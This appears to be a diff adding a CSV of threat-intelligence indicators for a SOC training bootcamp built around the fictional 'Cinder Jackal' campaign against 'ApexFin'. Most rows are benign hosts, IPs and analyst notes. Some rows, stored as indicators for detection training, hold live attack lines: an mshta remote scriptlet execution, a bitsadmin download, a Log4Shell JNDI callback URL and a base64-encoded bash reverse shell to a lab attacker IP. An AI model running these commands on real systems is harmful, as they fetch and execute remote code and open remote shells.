@@ -1,0 +1,71 @@
+lab_id,case_id,date,attribute_type,value,to_ids,comment,source
+LAB-1.1,CJ-001,2025-06-16,hostname,AF-SOC-LAB,False,Internal lab host used to validate MISP/TheHive/Cortex connectivity.,Internal reference
+LAB-1.1,CJ-001,2025-06-16,hostname,AF-WIN-WS01,False,Windows workstation enrolled for endpoint telemetry validation.,Internal reference
+LAB-1.1,CJ-001,2025-06-16,text,zeek-* / wazuh-alerts-* / elastic-agent-*,False,Expected Elastic index patterns for SOC health checks.,Course telemetry reference
+LAB-1.2,CJ-002,2025-06-18,ip-src,192.168.2.5,False,Training workstation source address observed repeatedly in Windows Filtering Platform and Log4Shell lab telemetry.,Lab internal IP
+LAB-1.2,CJ-002,2025-06-18,ip-dst,168.63.129.16,False,Azure host metadata/agent endpoint commonly observed in baseline Windows telemetry; included as benign baseline context.,Expected baseline cloud service
+LAB-1.2,CJ-002,2025-06-18,text,baseline outbound TCP/80 and TCP/443,False,Baseline network behavior used for contrast during later attack labs.,Baseline behavior
+LAB-1.3,CJ-003,2025-06-20,filename,powershell.exe,False,PowerShell execution observed during suspicious listener-oriented lab telemetry.,Process indicator
+LAB-1.3,CJ-003,2025-06-20,port,8000,False,Local listener port observed in PowerShell HTTP listener dataset.,Lab listener port
+LAB-1.3,CJ-003,2025-06-20,command-line,WindowsPowerShell\v1.0\powershell.exe,False,PowerShell executable path observed in process access and WFP context.,Process path fragment
+LAB-2.1,CJ-004,2025-07-08,email-src,billing@apexfin-support.com,True,Training sender used as phishing lead for the ApexFin scenario.,Training-only indicator
+LAB-2.1,CJ-004,2025-07-08,domain,cj-mail.com,True,Training phishing infrastructure domain from CJ Day 1/Day 2 narrative.,Training-only indicator
+LAB-2.1,CJ-004,2025-07-08,url,https://cj-mail.com/portal/login,True,Training phishing URL; use only inside lab MISP instance.,Training-only indicator
+LAB-2.1,CJ-004,2025-07-08,filename,invoice_Q2_2026.docm,True,Reported attachment name for phishing triage.,Training-only indicator
+LAB-2.1,CJ-004,2025-07-08,ip-dst,198.51.100.10,False,TEST-NET-2 address used as a safe training infrastructure lead.,Reserved documentation IP
+LAB-2.2,CJ-005,2025-07-10,filename,invoice_Q2_2026.docm,True,Maldoc filename carried forward from phishing triage.,Training-only indicator
+LAB-2.2,CJ-005,2025-07-10,filename,update_config.ps1,True,Decoded/staged PowerShell script name used by the fictional macro chain.,Training-only indicator
+LAB-2.2,CJ-005,2025-07-10,domain,cdn-cj-stage.com,True,Training staging domain for macro IOC extraction exercises.,Training-only indicator
+LAB-2.2,CJ-005,2025-07-10,url,https://cdn-cj-stage.com/a/update_config.ps1,True,Training staging URL for macro IOC extraction exercises.,Training-only indicator
+LAB-2.2,CJ-005,2025-07-10,sha256,9f2d7d5f46a1d1f5c3b8a8b461d19e6db4d1a4dce28a7b0711a44c1f5a4b77cf,True,Synthetic hash for the training maldoc/stager family.,Synthetic training hash
+LAB-2.3,CJ-006,2025-07-15,filename,mshta.exe,False,LOLBAS process used for proxy execution.,Windows LOLBAS binary
+LAB-2.3,CJ-006,2025-07-15,url,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct,False,Scriptlet URL observed in mshta command line.,Training source URL
+LAB-2.3,CJ-006,2025-07-15,ip-dst,151.101.248.133,False,Remote IP observed for mshta HTTPS retrieval.,Observed CDN endpoint
+LAB-2.3,CJ-006,2025-07-15,command-line,mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.005/src/mshta.sct')).Exec();close();,True,Full command line observed in Windows Security Event ID 4688.,Detection indicator
+LAB-2.3,CJ-006,2025-07-15,filename,calc.exe,False,Child process launched by Atomic Red Team mshta test payload.,Payload behavior evidence
+LAB-2.4,CJ-007,2025-07-17,filename,bitsadmin.exe,False,LOLBAS downloader observed in process creation telemetry.,Windows LOLBAS binary
+LAB-2.4,CJ-007,2025-07-17,url,https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md,False,BITSAdmin source URL observed in command line.,Training source URL
+LAB-2.4,CJ-007,2025-07-17,ip-dst,151.101.208.133,False,Remote IP observed for BITSAdmin download.,Observed CDN endpoint
+LAB-2.4,CJ-007,2025-07-17,filepath,C:\Users\wardog\AppData\Local\Temp\bitsadmin1_flag.ps1,True,Destination path observed in BITSAdmin command line.,Download target
+LAB-2.4,CJ-007,2025-07-17,command-line,bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\wardog\AppData\Local\Temp\bitsadmin1_flag.ps1,True,Full command line observed in Windows Security Event ID 4688.,Detection indicator
+LAB-3.1,CJ-008,2025-08-05,url,http://10.0.2.15/pixel.gif,True,HTTP beacon-like URL observed in APTSimulator/Cobalt Strike pattern dataset.,C2 pattern indicator
+LAB-3.1,CJ-008,2025-08-05,ip-dst,10.0.2.15,False,C2-style destination IP observed with pixel.gif retrieval.,Lab private IP
+LAB-3.1,CJ-008,2025-08-05,filename,CreateNamedPipe.exe,True,Tooling/process observed during Cobalt Strike pattern simulation.,Tooling indicator
+LAB-3.1,CJ-008,2025-08-05,named pipe,\\.\pipe\334485,True,Named pipe observed in service command behavior.,Named-pipe behavior
+LAB-3.1,CJ-008,2025-08-05,command-line,C:\Windows\system32\cmd.exe echo /c b6a1458f396 > \\.\pipe\334485,True,Command line observed writing to named pipe.,Behavioral indicator
+LAB-3.2,CJ-009,2025-08-07,hostname,WORKSTATION5.theshire.local,False,Source/affected host in lateral movement and scheduled task telemetry.,Lab host
+LAB-3.2,CJ-009,2025-08-07,hostname,WORKSTATION6.theshire.local,False,Additional host observed in lateral movement/schtasks telemetry.,Lab host
+LAB-3.2,CJ-009,2025-08-07,hostname,MORDORDC.theshire.local,False,Domain controller context observed in Empire scheduled task dataset.,Lab domain controller
+LAB-3.2,CJ-009,2025-08-07,user-account,THESHIRE\pgustavo,False,User context observed in scheduled task/PowerShell telemetry.,Account context
+LAB-3.2,CJ-009,2025-08-07,url,http://schemas.microsoft.com/wbem/wsman/1/windows/shell,False,WSMan shell URI observed in BITS/WinRM-related telemetry.,WinRM/WSMan behavior context
+LAB-3.3,CJ-010,2025-08-12,text,"timeline:pivot=process_guid,parent_process,command_line,url,ip",False,Timeline reconstruction pivot set for the lab.,Analyst workflow context
+LAB-3.3,CJ-010,2025-08-12,text,CJ chain: mshta → bitsadmin → C2-like beacon → timeline report,False,Narrative thread for timeline reconstruction.,Analyst narrative
+LAB-4.1,CJ-011,2025-08-26,regkey,HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon,False,Registry key repeatedly accessed in scheduled task modification telemetry.,Persistence hunt context
+LAB-4.1,CJ-011,2025-08-26,regkey,HKLM\System\CurrentControlSet\Services\bam\State\UserSettings,False,BAM registry path observed in process execution traces.,Execution artifact context
+LAB-4.1,CJ-011,2025-08-26,filename,cscript.exe,False,Script host observed in scheduled task modification telemetry.,Process context
+LAB-4.1,CJ-011,2025-08-26,url,http://schemas.microsoft.com/windows/2004/02/mit/task,False,Scheduled task XML namespace observed in telemetry.,Scheduled task artifact context
+LAB-4.2,CJ-012,2025-08-28,filename,Rubeus.exe,True,Expected lab tooling name for Kerberos-focused credential access exercise.,Expected lab tooling
+LAB-4.2,CJ-012,2025-08-28,filename,powershell.exe,False,PowerShell process context observed in prompt-for-credentials dataset.,Process context
+LAB-4.2,CJ-012,2025-08-28,filename,credui.dll,False,Credential Manager UI DLL loaded in prompt-for-credentials telemetry.,Credential UI artifact
+LAB-4.2,CJ-012,2025-08-28,windows-event-id,5379,False,Credential Manager credentials were read / Enumerate Credentials event observed in dataset.,Windows Security evidence
+LAB-4.2,CJ-012,2025-08-28,user-account,WORKSTATION5\wardog,False,User context observed in prompt-for-credentials telemetry.,Account context
+LAB-4.3,CJ-013,2025-09-02,user-account,THESHIRE\pgustavo,False,Account repeatedly appears across hunt datasets.,Hunt pivot
+LAB-4.3,CJ-013,2025-09-02,hostname,WORKSTATION5.theshire.local,False,Primary host for Day 4 hunt pivots.,Hunt pivot
+LAB-4.3,CJ-013,2025-09-02,text,hunt hypothesis: suspicious scheduled task + PowerShell + account context,False,Human-readable hunt hypothesis captured as CTI context.,Analyst workflow context
+LAB-5.1,CJ-014,2025-09-09,text,"AI validation status: human-reviewed, evidence-backed only",False,CTI governance marker for AI-assisted triage outputs.,AI validation control
+LAB-5.1,CJ-014,2025-09-09,text,reject unsupported IOC claims,False,Quality-control instruction for MISP promotion.,AI validation control
+LAB-5.2,CJ-015,2025-09-10,text,sigma:detection_status=unit-tested,False,Detection engineering status marker promoted with the lab CTI.,Detection metadata
+LAB-5.2,CJ-015,2025-09-10,text,"candidate detections: mshta scriptlet, bitsadmin transfer, encoded PowerShell",False,Detection candidates tied to earlier CJ evidence.,Detection metadata
+LAB-5.3,CJ-016,2025-09-11,text,final report pivot: CJ campaign spine event + per-lab MISP events,False,Capstone report linkage model.,Report metadata
+LAB-5.3,CJ-016,2025-09-11,text,confidence model: confirmed / likely / possible,False,Confidence language for final CTI reporting.,Report metadata
+CAPSTONE,CJ-017,2025-09-12,threat-actor,Cinder Jackal,False,Fictional training adversary used as campaign spine across the bootcamp.,Training actor
+CAPSTONE,CJ-017,2025-09-12,target-org,ApexFin Solutions,False,Fictional victim organization for the IgniteCyber Academy bootcamp.,Training victim
+CAPSTONE,CJ-017,2025-09-12,campaign-name,Project Obsidian / Cinder Jackal,False,Campaign name for the final case.,Campaign context
+LAB-3.4,CJ-010B,2025-08-14,url,ldap://192.168.2.6:1389/o=reference,True,JNDI LDAP reference observed in User-Agent string from PCAP.,Exploit indicator
+LAB-3.4,CJ-010B,2025-08-14,url,http://192.168.2.6:8888/,True,Remote Java class codebase observed in PCAP.,Exploit infrastructure
+LAB-3.4,CJ-010B,2025-08-14,uri,/Log4j-2.14.0-SNAPSHOT/api,False,HTTP endpoint targeted in Log4Shell request.,Victim endpoint
+LAB-3.4,CJ-010B,2025-08-14,uri,/xExportObject.class,True,Java class retrieved during JNDI exploitation.,Payload retrieval path
+LAB-3.4,CJ-010B,2025-08-14,ip-src,192.168.3.5,False,Source address observed initiating connection to Tomcat service in SecurityEvent data.,Lab internal IP
+LAB-3.4,CJ-010B,2025-08-14,ip-dst,192.168.2.5,False,Tomcat destination host observed in SecurityEvent data.,Lab victim IP
+LAB-3.4,CJ-010B,2025-08-14,ip-dst,192.168.2.6,False,LDAP/HTTP callback infrastructure IP observed in PCAP.,Lab attacker IP
+LAB-3.4,CJ-010B,2025-08-14,command-line,"bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjIuNi80NDMgMD4mMQo=}|{base64,-d}|{bash,-i}",True,Decoded reverse-shell payload carrier observed in PCAP strings.,Exploit behavior
